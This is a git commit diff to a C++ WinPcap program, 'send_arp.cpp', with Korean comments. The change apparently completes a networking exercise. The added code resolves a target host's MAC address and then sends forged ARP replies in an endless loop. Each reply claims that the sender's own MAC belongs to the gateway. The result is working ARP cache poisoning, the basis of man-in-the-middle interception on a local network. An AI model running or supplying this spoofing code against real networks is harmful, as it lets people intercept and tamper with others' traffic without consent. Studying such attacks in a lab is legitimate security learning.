41f786b2a80b8e4a287bc97336d1186e5287fbc1
IT4211 <rhdqor100@live.co.kr>
2016-08-04 08:45:14 +0900

    Complete send_arp

--- Network/send_arp/send_arp.cpp
+++ Network/send_arp/send_arp.cpp
@@ -77,10 +77,11 @@ typedef struct ip_header {
 int main(int argc, char *argv[])
 {
 	pcap_t* pkt;
-	//struct pcap_pkthdr *pkt_header;
-	//const u_char *pkt_data;
+	struct pcap_pkthdr *pkt_header;
+	const u_char *pkt_data;
 	pcap_if_t *dev;
-	//char *dev;	
+	int res;
+
 	char errbuf[PCAP_ERRBUF_SIZE];
 	const char* target_ip = argv[1];
 
@@ -90,6 +91,8 @@ int main(int argc, char *argv[])
 	char *Mymac = (char*)malloc(17);
 	u_int8_t byteMAC[8];
 	unsigned int lntMyip;
+	u_int8_t target_mac[8];
+	unsigned int IntGateip;
 
 	PIP_ADAPTER_INFO AdapterInfo;	// 어뎁터가 가지고 있는 정보를 저장
 	PIP_ADAPTER_INFO pAdapter = NULL;
@@ -102,6 +105,7 @@ int main(int argc, char *argv[])
 		return -1;
 	}*/
 	
+	unsigned int IntMytarget = (unsigned int)inet_addr(target_ip);
 
 	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
 
@@ -137,6 +141,7 @@ int main(int argc, char *argv[])
 	free(AdapterInfo);
 
 	lntMyip = (unsigned int)inet_addr(Myip);
+	IntGateip = (unsigned int)inet_addr(Gateway);
 
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &dev, errbuf) == -1)
 	{
@@ -163,7 +168,7 @@ int main(int argc, char *argv[])
 
 	printf("\nlistening on %s...\n", dev->description);
 
-	u_char packet[ETH_HDRLEN + ARP_HDRLEN + 60];
+	u_char packet[ETH_HDRLEN + ARP_HDRLEN];
 
 	ETHER_HDR *ether = (ETHER_HDR*)packet;
 	memset(ether->ether_dhost, 0xFF, sizeof(ether->ether_dhost));
@@ -181,14 +186,64 @@ int main(int argc, char *argv[])
 	memset(arp->target_mac, 0x00, sizeof(arp->target_mac));
 	*(unsigned int*)(arp->target_ip) = (unsigned int)inet_addr(target_ip);
 	
-	while (1) {
+	int temp = 50;
+	while (temp) {
 		if (pcap_sendpacket(pkt, packet, sizeof(packet)) != 0) {
 			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
 			return -1;
 		}
-		printf("send packet!!\n");
-		Sleep(1000);
+		printf("get mac send packet!!\n");
+		temp--;
 	}
+
+	/* 상대방의 reply 패킷을 가져와서 mac address 획득하기 */
+	
+	while ((res = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
+		if (res == 0)
+			continue;
+
+		ETHER_HDR *chkarp = (ETHER_HDR*)pkt_data;
+
+		if (ntohs(chkarp->ether_type) != ETHERTYPE_ARP) continue;
+		ARP_HDR * chkpkt = (ARP_HDR*)(pkt_data + ETH_HDRLEN);
+
+		if (ntohs(chkpkt->opcode) != ARP_OP_REPLY) continue;
+
+		if ((*(unsigned int*)chkpkt->sender_ip) == IntMytarget) {
+			memcpy(target_mac, chkpkt->sender_mac, sizeof(target_mac));
+			break;
+		}
+	}
+
+	/* 나를 gateway라고 속이는 arp reply 패킷 전송 */
+
+	u_char poison_pkt[ETH_HDRLEN + ARP_HDRLEN];
+
+	ETHER_HDR *ps_eth = (ETHER_HDR*)poison_pkt;
+	memcpy(ps_eth->ether_dhost, target_mac, sizeof(ps_eth->ether_dhost)); // 도착지는 target mac
+	memcpy(ps_eth->ether_shost, byteMAC, sizeof(ps_eth->ether_shost));	// 출발지는 byte mac
+	ps_eth->ether_type = htons(ETHERTYPE_ARP);	// 보내는 패킷은 arp 패킷
+
+	ARP_HDR *ps_arp = (ARP_HDR*)(poison_pkt + ETH_HDRLEN);
+	ps_arp->htype = htons(ARPHRD_ETHER);
+	ps_arp->ptype = htons(ETHERTYPE_IP);
+	ps_arp->hlen = sizeof(mac);
+	ps_arp->plen = sizeof(ip_address);
+	ps_arp->opcode = htons(ARP_OP_REPLY);
+	memcpy(ps_arp->sender_mac, byteMAC, sizeof(ps_arp->sender_mac));		// gateway의 맥은 내 mac이야!
+	*(unsigned int*)(ps_arp->sender_ip) = IntGateip;		//gateway ip로 속인다!!
+	memcpy(ps_arp->target_mac, target_mac, sizeof(ps_arp->target_mac));	// 상대방에게 응답! 
+	*(unsigned int*)(ps_arp->target_ip) = (unsigned int)inet_addr(target_ip);
+
+	while (1) {
+		if (pcap_sendpacket(pkt, poison_pkt, sizeof(poison_pkt)) != 0) {
+			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pkt));
+			return -1;
+		}
+		printf("send poison packet!!\n");
+		Sleep(100);
+	}
+
 	pcap_freealldevs(dev);
 
 	free(Myip);
